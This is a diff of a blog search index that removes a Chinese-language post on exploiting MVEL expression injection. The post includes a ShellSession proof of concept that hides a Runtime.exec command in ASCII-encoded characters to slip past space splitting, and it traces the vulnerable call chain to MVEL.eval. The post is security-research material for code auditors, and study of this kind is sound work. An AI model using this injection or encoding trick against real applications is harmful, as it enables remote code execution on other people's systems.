+        <tag>Fastjson</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>MVEL表达式漏洞利用方式</title>
-    <url>/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/</url>
-    <content><![CDATA[<p>MVEL 是一个表达式语言，一般用于解析和执行基于 Java 基础语言和语法风格的表达式。在动态规则执行和条件匹配方面，MVEL 是一个出色的选择，因为它允许你在运行时定义和修改规则，并立即处理这些规则。</p>
-<p><em>由上面这句话可以看出他可以执行基本的Java语句，那就有可能造成命令执行</em> </p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
-<li>maven</li>
-</ul>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.mvel&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;mvel2&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;2.4.4.Final&lt;/version&gt; &lt;!-- 你可以根据需要选择其他版本 --&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="MVEL-eval-expression"><a href="#MVEL-eval-expression" class="headerlink" title="MVEL.eval(expression)"></a>MVEL.eval(expression)</h2> 
-
-<p>成功弹出了计算器，说明我们的java代码被正确的执行了。<br>此时可以得出如果我们在白盒审计中发现MVEL直接调用eval函数，那我们就可以插入恶意的java代码去造成命令执行。</p>
-<h2 id="ShellSession"><a href="#ShellSession" class="headerlink" title="ShellSession"></a>ShellSession</h2><p>这是个MVEL表达式里面的一个类，这个类也可以造成命令执行，但是需要对我们传入的字符串进行一定的处理。<br>且他造成命令执行的入口并不是eval函数，而是他有参构造函数的时候一步一步调用到eval。如果实例化的行为可控，那就可以造成漏洞。</p>
-<p>恶意代码</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.mvel2.sh.ShellSession;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String expression = &quot;push Runtime.getRuntime().exec(String.valueOf((char)111)+String.valueOf((char)112)+String.valueOf((char)101)+String.valueOf((char)110)+String.valueOf((char)32)+String.valueOf((char)45)+String.valueOf((char)97)+String.valueOf((char)32)+String.valueOf((char)67)+String.valueOf((char)97)+String.valueOf((char)108)+String.valueOf((char)99)+String.valueOf((char)117)+String.valueOf((char)108)+String.valueOf((char)97)+String.valueOf((char)116)+String.valueOf((char)111)+String.valueOf((char)114));&quot;;//这个是弹出计算器的命令</span><br><span class="line">        ShellSession shellSession = new ShellSession(expression);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="ShellSession-String-init"><a href="#ShellSession-String-init" class="headerlink" title="ShellSession(String init)"></a>ShellSession(String init)</h4> 
-
-<p>他的有参构造函数调用了exec</p>
-<h4 id="exec-String-command"><a href="#exec-String-command" class="headerlink" title="exec(String command)"></a>exec(String command)</h4> 
-
-<p>这里将传入的字符串根据换行符分开，每次循环的时候取出一个，然后我们继续跟进_exec</p>
-<h4 id="exec"><a href="#exec" class="headerlink" title="_exec()"></a>_exec()</h4> 
-
-<p>这里会对我们刚才提取的inBuffer参数进行根据空格来分割，例如open -a Calculator 会分成 [‘open’,’-a’,’Calculator’]放入数组intokens里面<br>passParameters &#x3D; new String[inTokens.length - 1]提取了我们分隔出来的数组的最后一个参数，如例子那就是Calculator</p>
- 
-
-<p>提取inTokens数组里面第一个作为类，然后去执行execute方法。</p>
-<h4 id="pushContext类的利用"><a href="#pushContext类的利用" class="headerlink" title="pushContext类的利用"></a>pushContext类的利用</h4> 
-
-<p>这里面是存在MVEL.eval()的函数调用的，如果args参数可控，我们即可造成漏洞。</p>
- 
-
-<p>所以我们要满足三个条件</p>
-<ul>
-<li>第一个被空格分隔提取的参数要为对应类的key，假如push对应pushContext</li>
-<li>inTokens数组的长度要大于1，才会给我们的passParameters参数赋值</li>
-<li>this.commands.get(inTokens[0]))看看是否可以让他对应的类为pushContext</li>
-</ul>
-<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3> 
-
-<p>跟进去</p>
- 
-
-<p>走到有参构造这里，init字符串就是我们的恶意payload</p>
- 
-
-<p>这里根据我们的\n符号去分隔我们的字符串，但是我们没有换行，有<strong>空格</strong> ，所以就没有被分隔</p>
- 
-
-<p>继续跟进发现我们的字符串被空格分隔了，分成了push和后面的那部份</p>
- 
-
-<p>此时如果inTokens里面的第一个参数是push，则可以指向我们的漏洞利用类</p>
-<p>因为inTokens&gt;1所以进入给参数赋值</p>
- 
-
-<p>走到这里漏洞利用的地方</p>
- 
-
-<p>就可以理解为pushContext.execute(this,我们的恶意java代码)</p>
- 
-
-<p>最后走向我们的MVEL的eval函数利用点</p>
- 
-
-<p>最后弹出了计算器。</p>
-<h3 id="paylaod分析"><a href="#paylaod分析" class="headerlink" title="paylaod分析"></a>paylaod分析</h3><ul>
-<li>首先我们需要用到类pushContext，又因为他获取这个类是从map里面get(key)提取的，push-&gt;pushContext，所以我们的恶意字符串第一个参数要为push，然后第二个参数是我们的恶意代码，恶意代码跟push会根据空格分开 </li>
-<li>然后为什么不直接用open -a Calculator呢，因为这个命令中间也有空格，那参数就会被分开，所以需要转换为ascall码对应的字符串去拼接，就是中间不能出现空格</li>
-</ul>
-]]></content>
   </entry>
 </search>
